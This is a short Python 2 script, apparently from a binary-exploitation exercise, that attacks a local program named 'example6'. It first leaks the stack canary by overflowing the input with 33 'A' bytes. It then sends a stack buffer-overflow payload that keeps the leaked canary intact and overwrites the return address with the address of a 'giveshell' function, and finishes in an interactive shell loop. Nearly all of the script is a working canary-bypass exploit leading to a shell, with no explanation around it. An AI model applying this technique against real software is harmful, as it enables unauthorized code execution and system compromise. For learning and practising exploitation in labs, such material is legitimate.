#!/usr/bin/python

import struct
import subprocess
import os
import pty
import sys

def readline(fd):
    res = ''
    try:
        while True:
            ch = os.read(fd,1)
            res += ch 
            if ch == '\n':
                return res 
    except:
        raise


def read(fd,n):
    return os.read(fd,n)

def writeline(proc, data):
    try:
        proc.stdin.write(data+'\n')
        proc.stdin.flush()
    except:
        raise

def write(proc,data):
    try:
        proc.stdin.write(data)
        proc.stdin.flush()
    except:
        raise

def p32(val):
    return struct.pack("<I", val)

def u32(data):
    return struct.unpack("<I", data)[0]

out_r, out_w = pty.openpty()
s = subprocess.Popen("./example6", stdin=subprocess.PIPE, stdout=out_w)

print(read(out_r,10)) #Input1:

write(s, "A"*33)

data = read(out_r, 1024)

print("[+] data : "+ data)
canary = "\x00" + data.split("A"*33)[1][:3]

print("[+] CANARY : " + hex(u32(canary)))

print(read(out_r, 10)) #Input2
giveshell = 0x64d #retrieve from example6_leak.py

payload = "A"*32 #Filling buf
payload += canary
payload += "B"*4 #padding until RET
payload += p32(giveshell)

write(s, payload)

print("[+] get shell")

while True:
    cmd = raw_input("$ ")
    writeline(s, cmd)
    res = read(out_r, 102400)
    sys.stdout.write(res)


